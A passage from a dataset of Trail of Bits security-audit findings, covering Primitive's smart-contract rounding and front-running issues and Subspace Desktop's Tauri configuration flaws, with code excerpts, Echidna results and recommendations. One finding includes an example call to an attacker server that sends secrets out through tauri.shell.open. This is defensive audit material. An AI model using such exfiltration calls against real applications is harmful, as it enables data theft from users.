Short term, add zero-value checks for all function arguments to ensure that users cannot mistakenly set incorrect values, misconguring the system. Long term, use Slither, which will catch functions that do not have zero-value checks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. uint256.percentage() and int256.percentage() are not inverses of each other ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "The Units library provides two percentage helper functions to convert unsigned integers to signed 64x64 xed-point values, and vice versa. Due to rounding errors, these functions are not direct inverses of each other. /// @notice Converts denormalized percentage integer to a fixed point 64.64 number /// @dev Convert unsigned 256-bit integer number into signed 64.64 fixed point number /// @param denorm Unsigned percentage integer with precision of 1e4 /// @return Signed 64.64 fixed point percentage with precision of 1e4 function percentage( uint256 denorm) internal pure returns ( int128 ) { return denorm. divu (PERCENTAGE); } /// @notice Converts signed 64.64 fixed point percentage to a denormalized percetage integer /// @param denorm Signed 64.64 fixed point percentage /// @return Unsigned percentage denormalized with precision of 1e4 function percentage( int128 denorm) internal pure returns ( uint256 ) { return denorm. mulu (PERCENTAGE); } Figure 6.1: rmm-core/contracts/libraries/Units.sol#L53-L66 These two functions use ABDKMath64x64.divu() and ABDKMath64x64.mulu() , which both round downward toward zero. As a result, if a uint256 value is converted to a signed 64x64 xed point and then converted back to a uint256 value, the result will not equal the original uint256 value: function scalePercentages (uint256 value ) public { require(value > Units.PERCENTAGE); int128 signedPercentage = value.percentage(); uint256 unsignedPercentage = signedPercentage.percentage(); if(unsignedPercentage != value) { emit AssertionFailed( \"scalePercentages\" , signedPercentage, unsignedPercentage); assert(false); } Figure 6.2: rmm-core/contracts/LibraryMathEchidna.sol#L48-L57 used Echidna to determine this property violation: Analyzing contract: /rmm-core/contracts/LibraryMathEchidna.sol:LibraryMathEchidna scalePercentages(uint256): failed! Call sequence: scalePercentages(10006) Event sequence: Panic(1), AssertionFailed(\"scalePercentages\", 18457812120153777346, 10005) Figure 6.3: Echidna results Exploit Scenario 1. uint256.percentage()  10006.percentage() = 1.0006 , which truncates down to 1. 2. int128.percentage()  1.percentage() = 10000 . 3. The assertion fails because 10006 != 10000 . Recommendations Short term, either remove the int128.percentage() function if it is unused in the system or ensure that the percentages round in the correct direction to minimize rounding errors. Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Users can allocate tokens to a pool at the moment the pool reaches maturity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "Users can allocate tokens to a pool at the moment the pool reaches maturity, which creates an opportunity for attackers to front-run or update the curve right before the maturity period ends. function allocate ( bytes32 poolId , address recipient , uint256 delRisky , uint256 delStable , bool fromMargin , bytes calldata data ) external override lock returns ( uint256 delLiquidity ) { if (delRisky == 0 || delStable == 0 ) revert ZeroDeltasError(); Reserve.Data storage reserve = reserves[poolId]; if (reserve.blockTimestamp == 0 ) revert UninitializedError(); uint32 timestamp = _blockTimestamp(); if (timestamp > calibrations[poolId].maturity) revert PoolExpiredError(); uint256 liquidity0 = (delRisky * reserve.liquidity) / uint256 (reserve.reserveRisky); uint256 liquidity1 = (delStable * reserve.liquidity) / uint256 (reserve.reserveStable); delLiquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1; if (delLiquidity == 0 ) revert ZeroLiquidityError(); liquidity[recipient][poolId] += delLiquidity; // increase position liquidity reserve.allocate(delRisky, delStable, delLiquidity, timestamp); // increase reserves and liquidity if (fromMargin) { margins.withdraw(delRisky, delStable); // removes tokens from `msg.sender` margin account } else { ( uint256 balRisky , uint256 balStable ) = (balanceRisky(), balanceStable()); IPrimitiveLiquidityCallback( msg.sender ).allocateCallback(delRisky, delStable, data); // agnostic payment checkRiskyBalance(balRisky + delRisky); checkStableBalance(balStable + delStable); } emit Allocate( msg.sender , recipient, poolId, delRisky, delStable); } Figure 7.1: rmm-core/contracts/PrimitiveEngine.sol#L236-L268 Recommendations Short term, document the expected behavior of transactions to allocate funds into a pool that has just reached maturity and analyze the front-running risk. Long term, analyze all front-running risks on all transactions in the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Possible front-running vulnerability during BUFFER time ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "The PrimitiveEngine.swap function permits swap transactions until 120 seconds after maturity, which could enable miners to front-run swap transactions and engage in malicious behavior. The constant tau value may allow miners to prot from front-running transactions when the swap curve is locked after maturity. SwapDetails memory details = SwapDetails({ recipient: recipient, poolId: poolId, deltaIn: deltaIn, deltaOut: deltaOut, riskyForStable: riskyForStable, fromMargin: fromMargin, toMargin: toMargin, timestamp: _blockTimestamp() }); uint32 lastTimestamp = _updateLastTimestamp(details.poolId); // updates lastTimestamp of `poolId` if (details.timestamp > lastTimestamp + BUFFER) revert PoolExpiredError(); // 120s buffer to allow final swaps Figure 8.1: rmm-core/contracts/PrimitiveEngine.sol#L314-L326 Recommendations Short term, perform an o-chain analysis on the curve and the swaps to determine the impact of a front-running attack on these transactions. Long term, perform an additional economic analysis with historical data on pools to determine the impact of front-running attacks on all functionality in the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "9. Inconsistency in allocate and remove functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "The allocate and remove functions do not have the same interface, as one would expect. The allocate function allows users to set the recipient of the allocated liquidity and choose whether the funds will be taken from the margins or sent directly. The remove function unallocates the liquidity from the pool and sends the tokens to the msg.sender ; with this function, users cannot set the recipient of the tokens or choose whether the tokens will be credited to their margins for future use or directly sent back to them. function allocate ( bytes32 poolId , address recipient , uint256 delRisky , uint256 delStable , bool fromMargin , bytes calldata data ) external override lock returns ( uint256 delLiquidity ) { if (delRisky == 0 || delStable == 0 ) revert ZeroDeltasError(); Reserve.Data storage reserve = reserves[poolId]; if (reserve.blockTimestamp == 0 ) revert UninitializedError(); uint32 timestamp = _blockTimestamp(); if (timestamp > calibrations[poolId].maturity) revert PoolExpiredError(); uint256 liquidity0 = (delRisky * reserve.liquidity) / uint256 (reserve.reserveRisky); uint256 liquidity1 = (delStable * reserve.liquidity) / uint256 (reserve.reserveStable); delLiquidity = liquidity0 < liquidity1 ? liquidity0 : liquidity1; if (delLiquidity == 0 ) revert ZeroLiquidityError(); liquidity[recipient][poolId] += delLiquidity; // increase position liquidity reserve.allocate(delRisky, delStable, delLiquidity, timestamp); // increase reserves and liquidity if (fromMargin) { margins.withdraw(delRisky, delStable); // removes tokens from `msg.sender` margin account } else { ( uint256 balRisky , uint256 balStable ) = (balanceRisky(), balanceStable()); IPrimitiveLiquidityCallback( msg.sender ).allocateCallback(delRisky, delStable, data); // agnostic payment checkRiskyBalance(balRisky + delRisky); checkStableBalance(balStable + delStable); } emit Allocate( msg.sender , recipient, poolId, delRisky, delStable); } Figure 9.1: rmm-core/contracts/PrimitiveEngine.sol#L236-L268 Recommendations Short term, either document the design decision or add the logic to the remove function allowing users to set the recipient and to choose whether the tokens should be credited to their margins . Long term, make sure to document design decisions and the rationale behind them, especially for behavior that may not be obvious.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "10. Areas of the codebase that are inconsistent with the documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "The Primitive codebase contains clear documentation and mathematical analysis denoting the intended behavior of the system. However, we identied certain areas in which the implementation does not match the white paper, including the following:  Expected range for the gamma value of a pool. The white paper denes 10,000 as 100% in the smart contract; however, the contract checks that the provided gamma is between 9,000 (inclusive) and 10,000 (exclusive); if it is not within this range, the pool reverts with a GammaError . The white paper should be updated to reect the behavior of the code in these areas. Recommendations Short term, review and properly document all areas of the codebase with this gamma range check. Long term, ensure that the formal specication matches the expected behavior of the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "11. Allocate and remove are not exact inverses of each other ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "Due to the rounding logic used in the codebase, when users allocate funds into a system, they may not receive the same amount back when they remove them. When funds are allocated into a system, the values are rounded down (through native truncation) when they are added to the reserves: /// @notice Add to both reserves and total supply of liquidity /// @param reserve Reserve storage to manipulate /// @param delRisky Amount of risky tokens to add to the reserve /// @param delStable Amount of stable tokens to add to the reserve /// @param delLiquidity Amount of liquidity created with the provided tokens /// @param blockTimestamp Timestamp used to update cumulative reserves function allocate ( Data storage reserve, uint256 delRisky , uint256 delStable , uint256 delLiquidity , uint32 blockTimestamp ) internal { update(reserve, blockTimestamp); reserve.reserveRisky += delRisky.toUint128(); reserve.reserveStable += delStable.toUint128(); reserve.liquidity += delLiquidity.toUint128(); } Figure 11.1: rmm-core/contracts/libraries/Reserve.sol#L70-L87 When funds are removed from the reserves, they are similarly truncated: /// @notice Remove from both reserves and total supply of liquidity /// @param reserve Reserve storage to manipulate /// @param delRisky Amount of risky tokens to remove to the reserve /// @param delStable Amount of stable tokens to remove to the reserve /// @param delLiquidity Amount of liquidity removed from total supply /// @param blockTimestamp Timestamp used to update cumulative reserves function remove( Data storage reserve, uint256 delRisky, uint256 delStable, uint256 delLiquidity, uint32 blockTimestamp ) internal { update(reserve, blockTimestamp); reserve.reserveRisky -= delRisky.toUint128(); reserve.reserveStable -= delStable.toUint128(); reserve.liquidity -= delLiquidity.toUint128(); } Figure 11.2: rmm-core/contracts/libraries/Reserve.sol#L89-L106 We used the following Echidna property to test this behavior: function check_allocate_remove_inverses( uint256 randomId, uint256 intendedLiquidity, bool fromMargin ) public { AllocateCall memory allocate; allocate.poolId = Addresses.retrieve_created_pool(randomId); retrieve_current_pool_data(allocate.poolId, true ); intendedLiquidity = E2E_Helper.one_to_max_uint64(intendedLiquidity); allocate.delRisky = (intendedLiquidity * precall.reserve.reserveRisky) / precall.reserve.liquidity; allocate.delStable = (intendedLiquidity * precall.reserve.reserveStable) / precall.reserve.liquidity; uint256 delLiquidity = allocate_helper(allocate); // these are calculated the amount returned when remove is called ( uint256 removeRisky, uint256 removeStable) = remove_should_succeed(allocate.poolId, delLiquidity); emit AllocateRemoveDifference(allocate.delRisky, removeRisky); emit AllocateRemoveDifference(allocate.delStable, removeStable); assert (allocate.delRisky == removeRisky); assert (allocate.delStable == removeStable); assert (intendedLiquidity == delLiquidity); } Figure 11.3: rmm-core/contracts/libraries/Reserve.sol#L89-L106 In considering this rounding logic, we used Echidna to calculate the most optimal allocate value for an amount of liquidity, which resulted 1,920,041,647,503 as the dierence in the amount allocated and the amount removed. check_allocate_remove_inverses(uint256,uint256,bool): failed! Call sequence: create_new_pool_should_not_revert(113263940847354084267525170308314,0,12,58,414705177,292070 35433870938731770491094459037949100611312053389816037169023399245174) from: 0x0000000000000000000000000000000000020000 Gas: 0xbebc20 check_allocate_remove_inverses(513288669432172152578276403318402760987129411133329015270396, 675391606931488162786753316903883654910567233327356334685,false) from: 0x1E2F9E10D02a6b8F8f69fcBf515e75039D2EA30d Event sequence: Panic(1), Transfer(6361150874), Transfer(64302260917206574294870), AllocateMarginBalance(0, 0, 6361150874, 64302260917206574294870), Transfer(6361150874), Transfer(64302260917206574294870), Allocate(6361150874, 64302260917206574294870), Remove(6361150873, 64302260915286532647367), AllocateRemoveDifference(6361150874, 6361150873), AllocateRemoveDifference( 64302260917206574294870, 64302260915286532647367 ) Figure 11.4: Echidna results Exploit Scenario Alice, a Primitive user, determines a specic amount of liquidity that she wants to put into the system. She calculates the required risky and stable tokens to make the trade, and then allocates the funds to the pool. Due to the rounding direction in the allocate operation and the pool, she receives less than she expected after removing her liquidity. Recommendations Short term, perform additional analysis to determine a safe delta value to allow the allocate and remove operations to happen. Document this issue for end users to ensure that they are aware of the rounding behavior. Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. scaleToX64() and scalefromX64() are not inverses of each other ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "The Units library provides the scaleToX64() and scalefromX64() helper functions to convert unsigned integers to signed 64x64 xed-point values, and vice versa. Due to rounding errors, these functions are not direct inverses of each other. /// @notice Converts unsigned 256-bit wei value into a fixed point 64.64 number /// @param value Unsigned 256-bit wei amount, in native precision /// @param factor Scaling factor for `value`, used to calculate decimals of `value` /// @return y Signed 64.64 fixed point number scaled from native precision function scaleToX64 ( uint256 value , uint256 factor ) internal pure returns ( int128 y ) { uint256 scaleFactor = PRECISION / factor; y = value.divu(scaleFactor); } Figure 12.1: rmm-core/contracts/libraries/Units.sol#L35-L42 These two functions use ABDKMath64x64.divu() and ABDKMath64x64.mulu() , which both round downward toward zero. As a result, if a uint256 value is converted to a signed 64x64 xed point and then converted back to a uint256 value, the result will not equal the original uint256 value: /// @notice Converts signed fixed point 64.64 number into unsigned 256-bit wei value /// @param value Signed fixed point 64.64 number to convert from precision of 10^18 /// @param factor Scaling factor for `value`, used to calculate decimals of `value` /// @return y Unsigned 256-bit wei amount scaled to native precision of 10^(18 - factor) function scalefromX64 ( int128 value , uint256 factor ) internal pure returns ( uint256 y ) { uint256 scaleFactor = PRECISION / factor; y = value.mulu(scaleFactor); } Figure 12.2: rmm-core/contracts/libraries/Units.sol#L44-L51 We used the following Echidna property to test this behavior: function scaleToAndFromX64Inverses (uint256 value , uint256 _decimals ) public { // will enforce factor between 0 - 12 uint256 factor = _decimals % ( 13 ); // will enforce scaledFactor between 1 - 10**12 , because 10**0 = 1 uint256 scaledFactor = 10 **factor; int128 scaledUpValue = value.scaleToX64(scaledFactor); uint256 scaledDownValue = scaledUpValue.scalefromX64(scaledFactor); assert(scaledDownValue == value); } Figure 12.3: contracts/crytic/LibraryMathEchidna.sol scaleToAndFromX64Inverses(uint256,uint256): failed! Call sequence: scaleToAndFromX64Inverses(1,0) Event sequence: Panic(1) Figure 12.4: Echidna results Recommendations Short term, ensure that the percentages round in the correct direction to minimize rounding errors. Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. getCDF always returns output in the range of (0, 1) ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "CumulativeNormalDistribution provides the getCDF function to calculate an approximation of the cumulative distribution function, which should result in (0, 1] ; however, the getCDF function could return 1 . /// @notice Uses Abramowitz and Stegun approximation: /// https://en.wikipedia.org/wiki/Abramowitz_and_Stegun /// @dev Maximum error: 3.15x10-3 /// @return Standard Normal Cumulative Distribution Function of `x` function getCDF( int128 x) internal pure returns ( int128 ) { int128 z = x.div(CDF3); int128 t = ONE_INT.div(ONE_INT.add(CDF0.mul(z.abs()))); int128 erf = getErrorFunction(z, t); if (z < 0 ) { erf = erf.neg(); } int128 result = (HALF_INT).mul(ONE_INT.add(erf)); return result; } Figure 13.1: rmm-core/contracts/libraries/CumulativeNormalDistribution.sol#L24-L37 We used the following Echidna property to test this behavior. function CDFCheckRange( uint128 x, uint128 neg) public { int128 x_x = realisticCDFInput(x, neg); int128 res = x_x.getCDF(); emit P(x_x, res, res.toInt()); assert (res > 0 && res.toInt() < 1 ); } Figure 13.2: rmm-core/contracts/LibraryMathEchidna.sol CDFCheckRange(uint128,uint128): failed! Call sequence: CDFCheckRange(168951622815827493037,1486973755574663235619590266651) Event sequence: Panic(1), P(168951622815827493037, 18446744073709551616, 1) Figure 13.3: Echidna results Recommendations Short term, perform additional analysis to determine whether this behavior is an issue for the system. Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. Lack of data validation on withdrawal operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Primitive.pdf",
        "body": "The withdraw function allows users to specify the recipient to send funds to. Due to a lack of data validation, the address of the engine could be set as the recipient. As a result, the tokens will be transferred directly to the engine itself. /// @inheritdoc IPrimitiveEngineActions function withdraw ( address recipient , uint256 delRisky , uint256 delStable ) external override lock { if (delRisky == 0 && delStable == 0 ) revert ZeroDeltasError(); margins.withdraw(delRisky, delStable); // state update if (delRisky != 0 ) IERC20(risky).safeTransfer(recipient, delRisky); if (delStable != 0 ) IERC20(stable).safeTransfer(recipient, delStable); emit Withdraw( msg.sender , recipient, delRisky, delStable); } Figure 14.1: rmm-core/contracts/PrimitiveEngine.sol#L221-L232 We used the following Echidna property to test this behavior. function withdraw_with_only_non_zero_addr( address recipient, uint256 delRisky, uint256 delStable ) public { require (recipient != address ( 0 )); //ensures that delRisky and delStable are at least 1 and not too large to overflow the deposit delRisky = E2E_Helper.one_to_max_uint64(delRisky); delStable = E2E_Helper.one_to_max_uint64(delStable); MarginHelper memory senderMargins = populate_margin_helper( address ( this )); if (senderMargins.marginRisky < delRisky || senderMargins.marginStable < delStable) { withdraw_should_revert(recipient, delRisky, delStable); } else { withdraw_should_succeed(recipient, delRisky, delStable); } } function withdraw_should_succeed ( address recipient , uint256 delRisky , uint256 delStable ) internal { MarginHelper memory precallSender = populate_margin_helper( address ( this )); MarginHelper memory precallRecipient = populate_margin_helper(recipient); uint256 balanceRecipientRiskyBefore = risky.balanceOf(recipient); uint256 balanceRecipientStableBefore = stable.balanceOf(recipient); uint256 balanceEngineRiskyBefore = risky.balanceOf( address (engine)); uint256 balanceEngineStableBefore = stable.balanceOf( address (engine)); ( bool success , ) = address (engine).call( abi.encodeWithSignature( \"withdraw(address,uint256,uint256)\" , recipient, delRisky, delStable) ); if (!success) { assert( false ); return ; } { assert_post_withdrawal(precallSender, precallRecipient, recipient, delRisky, delStable); //check token balances uint256 balanceRecipientRiskyAfter = risky.balanceOf(recipient); uint256 balanceRecipientStableAfter = stable.balanceOf(recipient); uint256 balanceEngineRiskyAfter = risky.balanceOf( address (engine)); uint256 balanceEngineStableAfter = stable.balanceOf( address (engine)); emit DepositWithdraw( \"balance recip risky\" , balanceRecipientRiskyBefore, balanceRecipientRiskyAfter, delRisky); emit DepositWithdraw( \"balance recip stable\" , balanceRecipientStableBefore, balanceRecipientStableAfter, delStable); emit DepositWithdraw( \"balance engine risky\" , balanceEngineRiskyBefore, balanceEngineRiskyAfter, delRisky); emit DepositWithdraw( \"balance engine stable\" , balanceEngineStableBefore, balanceEngineStableAfter, delStable); assert(balanceRecipientRiskyAfter == balanceRecipientRiskyBefore + delRisky); assert(balanceRecipientStableAfter == balanceRecipientStableBefore + delStable); assert(balanceEngineRiskyAfter == balanceEngineRiskyBefore - delRisky); assert(balanceEngineStableAfter == balanceEngineStableBefore - delStable); } } Figure 14.2: rmm-core/contracts/crytic/E2E_Deposit_Withdrawal.sol withdraw_with_safe_range(address,uint256,uint256): failed! Call sequence: deposit_with_safe_range(0xa329c0648769a73afac7f9381e08fb43dbea72,115792089237316195423570985 008687907853269984665640564039447584007913129639937,5964323976539599410180707317759394870432 1625682232592596462650205581096120955) from: 0x1E2F9E10D02a6b8F8f69fcBf515e75039D2EA30d withdraw_with_safe_range(0x48bacb9266a570d521063ef5dd96e61686dbe788,5248038478797710845,748) from: 0x6A4A62E5A7eD13c361b176A5F62C2eE620Ac0DF8 Event sequence: Panic(1), Transfer(5248038478797710846), Transfer(749), Withdraw(5248038478797710846, 749), DepositWithdraw(\"sender risky\", 8446744073709551632, 3198705594911840786, 5248038478797710846), DepositWithdraw(\"sender stable\", 15594018607531992466, 15594018607531991717, 749), DepositWithdraw(\"balance recip risky\", 8446744073709551632, 8446744073709551632, 5248038478797710846), DepositWithdraw(\"balance recip stable\", 15594018607531992466, 15594018607531992466, 749), DepositWithdraw(\"balance engine risky\", 8446744073709551632, 8446744073709551632, 5248038478797710846), DepositWithdraw(\"balance engine stable\", 15594018607531992466, 15594018607531992466, 749) Figure 14.3: Echidna results Exploit Scenario Alice, a user, withdraws her funds from the Primitive engine. She accidentally species the address of the recipient as the engine address, and her funds are left stuck in the contract. Recommendations Short term, add a check to ensure that users cannot withdraw to the engine address directly to ensure that users are protected from these mistakes. Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Desktop application conguration le stored in group writable le ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "body": "The desktop application conguration le has group writable permissions, as shown in gure 1.1. >>> ls -l $HOME/.config/subspace-desktop/subspace-desktop.cfg -rw-rw-r-- 1 user user 143 $HOME/.config/subspace-desktop/subspace-desktop.cfg Figure 1.1: Permissions of the $HOME/.config/subspace-desktop/subspace-desktop.cfg le This conguration le contains the rewardAddress eld (gure 1.2), to which the Subspace farmer sends the farming rewards. Therefore, anyone who can modify this le can control the address that receives farming rewards. For this reason, only the le owner should have the permissions necessary to write to it. { \"plot\" : { \"location\" : \"<REDACTED>/.local/share/subspace-desktop/plots\" , \"sizeGB\" : 1 }, \"rewardAddress\" : \"stC2Mgq<REDACTED>\" , \"launchOnBoot\" : true , \"version\" : \"0.6.11\" , \"nodeName\" : \"agreeable-toothbrush-4936\" } Figure 1.2: An example of a conguration le Exploit Scenario An attacker controls a Linux user who belongs to the victims user group. Because every member of the user group is able to write to the victims conguration le, the attacker is able to change the rewardAddress eld of the le to an address she controls. As a result, she starts receiving the victims farming rewards. Recommendations Short term, change the conguration les permissions so that only its owner can read and write to it. This will prevent unauthorized users from reading and modifying the le. Additionally, create a centralized function that creates the conguration le; currently, the le is created by code in multiple places in the codebase. Long term, create tests to ensure that the conguration le is created with the correct permissions. 2. Insu\u0000cient validation of users reward addresses Severity: Low Diculty: Medium Type: Data Validation Finding ID: TOB-SPDF-2 Target: subspace-desktop/src/pages/ImportKey.vue",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Improper error handling ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "body": "The front end code handles errors incorrectly in the following cases:          The Linux auto launcher function createAutostartDir does not return an error if it fails to create the autostart directory. The Linux auto launcher function enable does not return an error if it fails to create the autostart le. The Linux auto launcher function disable does not return an error if it fails to remove the autostart le. The Linux auto launcher function isEnabled always returns true , even if it fails to read the autostart le, which indicates that the auto launcher is disabled. The exportLogs function does not display error messages to users when errors occur. Instead, it silently fails. If rewardAddress is not set, the startFarming function sends an error log to the back end but not to the front end. Despite the error, the function still tries to start farming without a reward address, causing the back end to error out. Without an error message displayed in the front end, the source of the failure is unclear. The Config::init function does not show users an error message if it fails to create the conguration directory. The Config::write function does not show users an error message if it fails to create the conguration directory, and it proceeds to try to write to the nonexistent conguration le. Additionally, it does not show an error message if it fails to write to the conguration le in its call to writeFile . The removePlot function does not return an error if it fails to delete the plots directory.   The createPlotDir function does not return an error if it fails to create the plots folder (e.g., if the given user does not have the permissions necessary to create the folder in that directory). This will cause the startPlotting function to fail silently; without an error message, the user cannot know the source of the failure. The createAutostartDir function logs an error unnecessarily. The function determines whether a directory exists by calling the readDir function; however, even though occasionally the directory may not be found (as expected), the function always logs an error if it is not found. Exploit Scenario To store his plots, a user chooses a directory that he does not have the permissions necessary to write to. The program fails but does not display a clear error message with the reason for the failure. The user cannot understand the problem, becomes frustrated, and deletes the application. Recommendations Short term, modify the code in the locations described above to handle errors consistently and to display messages with clear reasons for the errors in the UI. This will make the code more reliable and reduce the likelihood that users will face obstacles when using the Subspace Desktop application. Long term, write tests that trigger all possible error conditions and check that all errors are handled gracefully and are accompanied by error messages displayed to the user where relevant. This will prevent regressions during the development process.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Flawed regex in the Tauri conguration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "body": "The Tauri conguration that limits which les the front end can open with the systems default applications is awed. As shown in gure 4.1, the conguration le uses the [/subspace\\\\-desktop/] regex; the Subspace developers intended this regex to match le names that include the /subspace-desktop/ string, but the regex actually matches any string that has a single character inside the regex's square brackets. \"shell\" : { \"all\" : true , \"execute\" : true , \"open\" : \"[/subspace\\\\-desktop/]\" , \"scope\" : [ \"name\" : \"run-osascript\" , \"cmd\" : \"osascript\" , \"args\" : true { } ] }, Figure 4.1: subspace-desktop/src-tauri/tauri.conf.json#L81-L92 For example, tauri.shell.open(\"s\") is accepted as a valid location because s is inside the regexs square brackets. Contrarily, tauri.shell.open(\"z\") is an invalid location because z is not inside the square brackets. Besides opening les, in Linux, the tauri.shell.open function will handle anything that the xdg-open command handles. For example, tauri.shell.open(\"apt://firefox\") shows users a prompt to install Firefox. Attackers could also use the tauri.shell.open function to make arbitrary HTTP requests and bypass the CSPs connect-src directive with calls such as tauri.shell.open(\"https://<attacker-server>/?secret_data=<secrets>\") . Exploit Scenario An attacker nds a cross-site scripting (XSS) vulnerability in the Subspace Desktop front end. He uses the XSS vulnerability to open an arbitrary URL protocol with the exploit described above and gains the ability to remotely execute code on the users machine. For examples of how common URL protocol handlers can lead to remote code execution attacks, refer to the vulnerabilities in the Steam and Visual Studio Code URL protocols. Recommendations Short term, revise the regex so that the front end can open only file: URLs that are within the Subspace Desktop applications logs folder. Alternatively, have the Rust back end serve these les and disallow the front end from accessing any les (see issue TOB-SPDF-5 for a more complete architectural recommendation). Long term, write positive and negative tests that check the developers assumptions related to the Tauri conguration. 5. Insu\u0000cient privilege separation between the front end and back end Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-SPDF-5 Target: The Subspace Desktop architecture",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Vulnerable dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "body": "The Subspace Desktop Tauri application uses vulnerable Rust and Node dependencies, as reported by the cargo audit and yarn audit tools. Among the Rust crates used in the Tauri application, two are vulnerable, three are unmaintained, and six are yanked. The table below summarizes the ndings: Crate Version in Use Finding Latest Safe Version owning_ref 0.4.1 Memory corruption vulnerability ( RUSTSEC-2022-0040 ) Not available time 0.1.43 Memory corruption vulnerability ( RUSTSEC-2020-0071 ) 0.2.23 and newer ansi_term 0.12.1 dotenv 0.15.0 xml-rs 0.8.4 Unmaintained crate ( RUSTSEC-2021-0139 ) Unmaintained crate ( RUSTSEC-2021-0141 ) Unmaintained crate ( RUSTSEC-2022-0048 ) blake2 0.10.2 Yanked crate block-buffer 0.10.0 Yanked crate cpufeatures 0.2.1 Yanked crate iana-time-zone 0.1.44 Yanked crate Multiple alternatives dotenvy quick-xml 0.10.4 0.10.3 0.2.5 0.1.50 sp-version 5.0. For the Node dependencies used in the Tauri application, one is vulnerable to a high-severity issue and another is vulnerable to a moderate-severity issue. These vulnerable dependencies appear to be used only in the development dependencies. Package Finding Latest Safe Version got CVE-2022-33987 (Moderate severity) 11.8.5 and newer git-clone CVE-2022-25900 (High severity) Not available Exploit Scenario An attacker nds a way to exploit a known memory corruption vulnerability in one of the dependencies reported above and takes control of the application. Recommendations Short term, update the dependencies to their newest possible versions. Work with the library authors to update the indirect dependencies. Monitor the development of the x for owning_ref and upgrade it as soon as a safe version of the crate becomes available. Long term, run cargo audit and yarn audit regularly. Include cargo audit and yarn audit in the projects CI/CD pipeline to ensure that the team is aware of new vulnerabilities in the dependencies.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Broken error reporting link ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "body": "The create_full_client function calls the sp_panic_handler::set() function to set a URL for a Discord invitation; however, this invitation is broken. The documentation for the sp_panic_handler::set() function states that The bug_url parameter is an invitation for users to visit that URL to submit a bug report in the case where a panic happens. Because the link is broken, users cannot submit bug reports. sp_panic_handler::set( \" https://discord.gg/vhKF9w3x \" , env! ( \"SUBSTRATE_CLI_IMPL_VERSION\" ), ); Figure 7.1: subspace-desktop/src-tauri/src/node.rs#L169-L172 Exploit Scenario A user encounters a crash of Subspace Desktop and is presented with a broken link with which to report the error. The user is unable to report the error. Recommendations Short term, update the bug report link to the correct Discord invitation. Long term, use a URL on a domain controlled by Subspace Network as the bug reporting URL. This will allow Subspace Network developers to make adjustments to the reporting URL without pushing application updates. 8. Side e\u0000ects are triggered regardless of disk_farms validity Severity: Informational Diculty: High Type: Data Validation Finding ID: TOB-SPDF-8 Target: src-tauri/src/farmer.rs#L118-L192",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Network conguration path construction is duplicated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
